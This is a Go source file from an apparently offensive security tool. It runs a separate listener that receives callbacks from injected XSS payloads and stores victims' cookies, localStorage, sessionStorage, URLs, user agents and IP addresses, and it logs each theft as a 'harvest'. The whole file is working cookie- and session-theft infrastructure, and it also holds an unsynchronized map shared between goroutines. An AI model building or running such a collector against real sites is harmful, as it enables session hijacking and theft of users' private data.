package app

import (
	"context"
	"crypto/subtle"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	"jysecai/internal/config"
	"jysecai/internal/database"
	"jysecai/internal/handler"
	"jysecai/internal/xsshook"

	"go.uber.org/zap"
)

// xssCollectorProviderFn 暴露给 XSS 处理器读取当前收集服务参数（不含 token 上行）。
func xssCollectorProviderFn(cfg *config.Config, _ *xssCollectorRuntime, _ *zap.Logger) handler.XSSCollectorProvider {
	return func() (publicURL, token string, enabled bool) {
		c := &cfg.XSS
		if !c.EnabledEffective() {
			return "", "", false
		}
		return c.PublicURLEffective(), strings.TrimSpace(c.Token), c.Token != ""
	}
}

// xssCollectorRuntime 运行中的 XSS 收集服务句柄。
type xssCollectorRuntime struct {
	server  *http.Server
	ln      net.Listener
	stop    chan struct{}
	stopped chan struct{}
}

// startXSSCollector 启动 XSS 窃密回连收集服务（独立监听，不挂在主站路由下）。
// 返回 nil 表示配置关闭或不支持，不视为错误。
func startXSSCollector(db *database.DB, cfg *config.XSSConfig, logger *zap.Logger) (*xssCollectorRuntime, error) {
	if db == nil || cfg == nil || !cfg.EnabledEffective() {
		return nil, nil
	}
	token := strings.TrimSpace(cfg.Token)
	if token == "" {
		return nil, nil
	}
	addr := net.JoinHostPort(cfg.BindHostEffective(), itoa(cfg.BindPortEffective()))
	mux := http.NewServeMux()
	mux.HandleFunc("/api/xss/capture", handleXSSCapture(db, cfg, logger))
	mux.HandleFunc("/healthz", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = io.WriteString(w, "ok")
	})
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, err
	}
	srv := &http.Server{
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
	}
	rt := &xssCollectorRuntime{server: srv, ln: ln, stop: make(chan struct{}), stopped: make(chan struct{})}
	go func() {
		defer close(rt.stopped)
		if err := srv.Serve(ln); err != nil && err != http.ErrServerClosed {
			logger.Warn("XSS 收集服务退出异常", zap.Error(err))
		}
	}()
	logger.Info("XSS 收集服务已启动",
		zap.String("addr", ln.Addr().String()),
		zap.String("public_url", cfg.PublicURLEffective()),
		zap.Bool("dedup", cfg.CooldownSeconds > 0),
	)
	return rt, nil
}

// 小工具：避免在包内重复引入 strconv。
func itoa(v int) string {
	if v < 0 {
		v = 0
	}
	if v == 0 {
		return "0"
	}
	var b [20]byte
	i := len(b)
	for v > 0 {
		i--
		b[i] = byte('0' + v%10)
		v /= 10
	}
	return string(b[i:])
}

func (rt *xssCollectorRuntime) shutdown(ctx context.Context) {
	if rt == nil {
		return
	}
	select {
	case <-rt.stop:
	default:
		close(rt.stop)
	}
	_ = rt.server.Shutdown(ctx)
	select {
	case <-rt.stopped:
	case <-ctx.Done():
	}
}

// handleXSSCapture 接收植入脚本的回连，校验共享密钥并落库。
func handleXSSCapture(db *database.DB, cfg *config.XSSConfig, logger *zap.Logger) http.HandlerFunc {
	lastSeen := make(map[string]time.Time) // source_url → 上次收割时间（粗粒度去重）
	// 冷却窗 30 分钟 / 至少 30 秒的清道夫：回收过期去重键，防止长时间运行下 map 无限增长。
	if cfg.CooldownSeconds > 0 {
		go func() {
			ticker := time.NewTicker(30 * time.Second)
			defer ticker.Stop()
			for range ticker.C {
				cutoff := time.Now().Add(-time.Duration(cfg.CooldownSeconds) * time.Second)
				for k, t := range lastSeen {
					if t.Before(cutoff) {
						delete(lastSeen, k)
					}
				}
			}
		}()
	}

	return func(w http.ResponseWriter, r *http.Request) {
		// 载荷 XHR 使用 application/json + 自定义 X-XSS-Token 头，必触发 CORS 预检；
		// 预检响应必须放行方法与头，否则真实浏览器会直接拦截回连请求。
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-XSS-Token")
		w.Header().Set("Access-Control-Max-Age", "600")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		token := strings.TrimSpace(r.Header.Get("X-XSS-Token"))
		if token == "" {
			token = strings.TrimSpace(r.URL.Query().Get("token"))
		}
		if subtle.ConstantTimeCompare([]byte(token), []byte(cfg.Token)) != 1 {
			http.Error(w, "forbidden", http.StatusForbidden)
			return
		}

		var req xsshook.CaptureRequest
		body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
		if err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}
		if err := json.Unmarshal(body, &req); err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}
		if strings.TrimSpace(req.SourceURL) == "" {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}

		// 冷却去重（可选）：同一来源地址在窗口内只保留最新一次。
		if cfg.CooldownSeconds > 0 {
			key := strings.ToLower(strings.TrimSpace(req.SourceURL))
			now := time.Now()
			if last, ok := lastSeen[key]; ok && now.Sub(last) < time.Duration(cfg.CooldownSeconds)*time.Second {
				w.WriteHeader(http.StatusNoContent)
				return
			}
			lastSeen[key] = now
		}

		payloadID := strings.TrimSpace(req.PayloadID)
		projectID := ""
		conversationID := ""
		if payloadID != "" {
			if p, err := db.GetXSSPayload(payloadID); err == nil {
				projectID = p.ProjectID
				conversationID = p.ConversationID
				_ = db.MarkXSSPayloadFired(payloadID)
			}
		}

		capRow := &database.XSSCapture{
			PayloadID:      payloadID,
			ProjectID:      projectID,
			ConversationID: conversationID,
			SourceURL:      req.SourceURL,
			PageTitle:      req.PageTitle,
			UserAgent:      req.UserAgent,
			URLFragment:    req.URLFragment,
			ClientIP:       clientIP(r),
			Cookies:        make([]database.XSSCookie, 0, len(req.Cookies)),
			LocalStorage:   req.LocalStorage,
			SessionStorage: req.SessionStorage,
		}
		for _, ck := range req.Cookies {
			capRow.Cookies = append(capRow.Cookies, database.XSSCookie{
				Name:   ck.Name,
				Value:  ck.Value,
				Domain: ck.Domain,
				Path:   ck.Path,
			})
		}
		if _, err := db.CreateXSSCapture(capRow); err != nil {
			logger.Warn("XSS 收割入库失败", zap.Error(err))
			http.Error(w, "internal error", http.StatusInternalServerError)
			return
		}
		logger.Info("XSS 收割命中",
			zap.String("capture_id", capRow.ID),
			zap.String("source_url", capRow.SourceURL),
			zap.Int("cookies", len(capRow.Cookies)),
			zap.Int("local_storage", len(capRow.LocalStorage)),
		)
		w.WriteHeader(http.StatusNoContent)
	}
}

func clientIP(r *http.Request) string {
	ip := strings.TrimSpace(r.Header.Get("X-Forwarded-For"))
	if ip != "" {
		if idx := strings.Index(ip, ","); idx >= 0 {
			ip = ip[:idx]
		}
		ip = strings.TrimSpace(ip)
	} else if h, _, err := net.SplitHostPort(r.RemoteAddr); err == nil {
		ip = h
	} else {
		ip = r.RemoteAddr
	}
	return ip
}